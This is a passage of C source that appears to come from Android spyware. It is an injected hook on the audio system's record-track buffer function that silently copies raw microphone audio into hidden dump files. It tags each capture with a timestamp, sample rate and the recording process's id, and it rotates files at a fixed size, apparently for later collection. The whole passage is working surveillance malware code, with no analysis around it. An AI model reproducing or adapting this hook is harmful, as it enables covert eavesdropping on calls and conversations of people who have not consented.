  unsigned int sampleRate;
  struct timeval tv;
  ssize_t res;
  /* int ii, cblkIndex; */
  unsigned int uintTmp;
  struct cblk_t *cblk_tmp= NULL;
  off_t headerStart = 0, positionTmp = 0;
  time_t now;
  int tt = 0xf;

  unsigned int bufferRaw = 0;
  unsigned int framesCount = 0;
  unsigned int frameSize = 0;

  char randString[11]; // rand %d 10 + null;
  char pidC[11]; // pid %d 10 + null;
  char timestamp[11];  // epoch %ld 10 + null;
  int filenameLength = 0;
  char *filename;
  char* tmp;

  int written;

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- record3 -------------\n");
#endif

  // tmp
  framesCount = * (unsigned int*) (b + 4);

#ifdef DEBUG_HOOKFNC
//  log("> rt args %x %x %x - desiredFrames: %x \n", a, b, c, framesCount);
#endif



  /* call the original function */
  h_ptr = (void *) recordTrack_getNextBuffer_helper.orig;
  helper_precall(&recordTrack_getNextBuffer_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&recordTrack_getNextBuffer_helper);

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif


  /* fetch the necessary fields */
  cblk_ptr = (unsigned int*) (a + 0x1c) ;
  cblk = *cblk_ptr;
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk %p\n", cblk);
#endif

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk flags %x\n", *(signed int*) (cblk + 0x3c));
#endif

  /* [3] */
  frameSize = *(unsigned char*) (cblk + 0x34 );
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframeSize %x\n", frameSize);
#endif

  // not really useful, info only
  sampleRate = *(unsigned int*) (cblk + 0x30);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tsampleRate %x\n", sampleRate);
#endif

  /* [2] second field within AudioBufferProvider */
  framesCount = * (unsigned int*) (b + 4);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframesCount %x\n", framesCount);
#endif

  /* [1] first field (ptr) within AudioBufferProvider */
  bufferRaw = *(unsigned int*) (b);


  // add the cblk to the tracks list, if
  // we don't find it, it might be because
  // the injection took place after the track
  // was created
  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

  if( cblk_tmp == NULL ) {

    /* old code: insert from getBuffer  if( cblk_tmp != NULL ) { */

    cblk_tmp =  malloc( sizeof(struct cblk_t) );

#ifdef DEBUG_HOOKFNC
 //   log("cblk_tmp %x size %d\n", cblk_tmp, sizeof(cblk_tmp));
#endif

    cblk_tmp->cblk_index = cblk;

    /*
       record does not have a corresponding newTrack event
       for such reason possible status are start or stop only
     */
    cblk_tmp->lastStatus = STATUS_START;


    snprintf(randString, 11, "%lu", mrand48());
    snprintf(timestamp,  11, "%d", time(NULL));

    cblk_tmp->trackId = strdup(randString);

#ifdef DEBUG_HOOKFNC
   // log("trackId: %s\n", cblk_tmp->trackId);
#endif

    unsigned long mClient;
    mClient = *(unsigned long*) (a + mClient_thisP_offset);
    int pid = *(int*) (mClient + mPid_mClient_offset );
  #ifdef DEBUG_HOOKFNC
//  log("\tnew track cblk: %p calling pid=%d trackId: %s\n", cblk,pid,cblk_tmp->trackId);
  #endif
    if(pid>0){
    	int tmp=0;
    	tmp=get_command_id(pid);
#ifdef DEBUG_HOOKFNC
    	if(tmp<=0){
    		log("pid %d not found\n",pid);
    	}
#endif
    	pid=tmp;
     }else{
   	  pid=0;
     }
    //         Qi-<timestamp>-<id univoco per chiamata>-<canale>-<pid>.[tmp|boh]
    // length:  2-strlen(timestamp)-strlen(randString)-1.3.1 + 3 chars for '-'
    // filenameLength including null
    snprintf(pidC, 11, "%d", pid);
    filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(randString) + 1 + 4 + 1 + 3 + 1 + strlen(pidC);

    cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
    snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-l.bin",dumpPath, timestamp, randString,pidC );

#ifdef DEBUG_HOOKFNC
//    log("filename: %s\n", cblk_tmp->filename);
#endif


    cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);

#ifdef DEBUG_HOOKFNC
    log("%s fd: %d\n", cblk_tmp->filename, cblk_tmp->fd);
#endif


    cblk_tmp->startOfCircularBuffer = *(unsigned int*) (cblk + 0x18);
    cblk_tmp->frameCount = *(unsigned int*) (cblk + 0x1c);

#ifdef DEBUG_HOOKFNC
//    log("cblk start of circular buffer: %x\nframe count: %x\nframe size %d\nbuffer end: %x\n", cblk_tmp->startOfCircularBuffer, cblk_tmp->frameCount, frameSize, cblk_tmp->startOfCircularBuffer + (cblk_tmp->frameCount * frameSize));
#endif

    cblk_tmp->lastBufferRaw  = bufferRaw;
    cblk_tmp->lastFrameCount = framesCount;
    cblk_tmp->lastFrameSize  = frameSize;

    cblk_tmp->streamType = -2; // dummy value, we can't tell from within getNextBuffer the exact streamType
    cblk_tmp->sampleRate = sampleRate;
    cblk_tmp->pid=pid;
    // temporary fix for 2 stop call in a row
    cblk_tmp->stopDump = 0;

    HASH_ADD_INT(cblkTracks, cblk_index, cblk_tmp); // record
    cblk_tmp = NULL;

    HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

    if( cblk_tmp == NULL ) {
#ifdef DEBUG_HOOKFNC
      log("uthash shit happened\n");
#endif
      return result;
    }
#ifdef DEBUG_HOOKFNC
    log("\t\tgetNextBuffer added cblk\n");
#endif

  }

  else {

#ifdef DEBUG_HOOKFNC
//    log("\t\tstreamType: %d\n", cblk_tmp->streamType);
#endif

#ifdef DEBUG_HOOKFNC
    //TODO: temporary
    if( cblk_tmp->stopDump == 1)
      log("RECEVING MORE DATA FOR TRACK %p\n", cblk);
#endif

    if( result == 0 && framesCount != 0 && cblk_tmp->stopDump == 0 ) { // stopDump: temporary fix

      // header
      headerStart = lseek(cblk_tmp->fd, 0, SEEK_CUR);
      //log("\t\theaderStart: %x\n", headerStart);

      // epoch : streamType : sampleRate : blockLen

      uintTmp = 0xc00cc00c;
      write(cblk_tmp->fd, &uintTmp, 4); // 1] epoch
      write(cblk_tmp->fd, &uintTmp, 4); // 2] streamType
      write(cblk_tmp->fd, &uintTmp, 4); // 3] sampleRate
      write(cblk_tmp->fd, &uintTmp, 4); // 4] size of block

#ifdef DEBUG_HOOKFNC
 //     log("\t\t\tbuffer spans: %p -> %p\n", bufferRaw, (bufferRaw + framesCount * frameSize ) );
#endif
      res = write(cblk_tmp->fd, bufferRaw, framesCount * frameSize  );
#ifdef DEBUG_HOOKFNC
 //     log("\t\t\t\twrote: %d - expected: %d\n", res, framesCount * frameSize );
#endif
      positionTmp = lseek(cblk_tmp->fd, 0, SEEK_CUR);

#ifdef DEBUG_HOOKFNC
//      log("\t\tfake header written: %x\n", positionTmp);
#endif

      // if something is written fix the header
      if( res > 0 ) {
	// go back to start of header
	lseek(cblk_tmp->fd, headerStart, SEEK_SET);

#ifdef DEBUG_HOOKFNC
//	log("\t\trolled back: %x\n", lseek(cblk_tmp->fd, 0, SEEK_CUR));
#endif

	// write the header
	now = time(NULL);
	//tt = gettimeofday(&tv,NULL);
	written = write(cblk_tmp->fd, &now , 4); // 1] timestamp
	written = write(cblk_tmp->fd, &cblk_tmp->streamType , 4); // 2] streamType
	written = write(cblk_tmp->fd, &cblk_tmp->sampleRate , 4); // 3] sampleRate
	written = write(cblk_tmp->fd, &res , 4); // 4] res


#ifdef DEBUG_HOOKFNC
//	log("\t\t\theader fixed %x -> %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, cblk_tmp->sampleRate, res);
#endif

	// reposition the fd
	lseek(cblk_tmp->fd, positionTmp, SEEK_SET);
	//log("\t\trolled forward: %x\n", lseek(cblk_tmp->fd, 0, SEEK_CUR));


	/* dump when fd is at position >= 5242880 */
	if( lseek(cblk_tmp->fd, 0, SEEK_CUR) >= FILESIZE ) {

#ifdef DEBUG_HOOKFNC
	  log("should take a dump\n");
#endif

	  /* rename file *.bin to *.tmp */
	  filename = strdup(cblk_tmp->filename); // check return value
	  *(filename+strlen(filename)-1) = 'p';
	  *(filename+strlen(filename)-2) = 'm';
	  *(filename+strlen(filename)-3) = 't';


#ifdef DEBUG_HOOKFNC
//	  log("fname %s\n", filename);
	  //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif
	  rename(cblk_tmp->filename, filename);

	  if( filename != NULL)  {
#ifdef DEBUG_HOOKFNC
//	    log("freeing filename\n");
#endif
	    free(filename);
#ifdef DEBUG_HOOKFNC
//	    log("after filename free\n");
#endif
	  }

	  close(cblk_tmp->fd);

	  /* generate a new filename for the track */
	  snprintf(timestamp,  11, "%d", time(NULL));
	  snprintf(pidC,  11, "%d", cblk_tmp->pid);

	  filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(cblk_tmp->trackId) + 1 + 4 + 1 + 3 + 1 + strlen(pidC);

	  cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
	  snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-l.bin", dumpPath, timestamp, cblk_tmp->trackId,pidC );

#ifdef DEBUG_HOOKFNC
	  log("new filename: %s\n", cblk_tmp->filename);
#endif

	  cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
#ifdef DEBUG_HOOKFNC
//	  log("%s fd: %d\n", cblk_tmp->filename, cblk_tmp->fd);
#endif

	}

      }
      // otherwise remove the header, we don't need this block
      else {
	lseek(cblk_tmp->fd, headerStart, SEEK_SET);
      }

    }

    /* in both cases update cblk_tmp for the next run  */
    cblk_tmp->lastBufferRaw  = bufferRaw;
    cblk_tmp->lastFrameCount = framesCount;
    cblk_tmp->lastFrameSize  = frameSize;

  }

#ifdef DEBUG_HOOKFNC
 // log("\t\t\t------- end record3 -------------\n");
#endif


  return result;

}
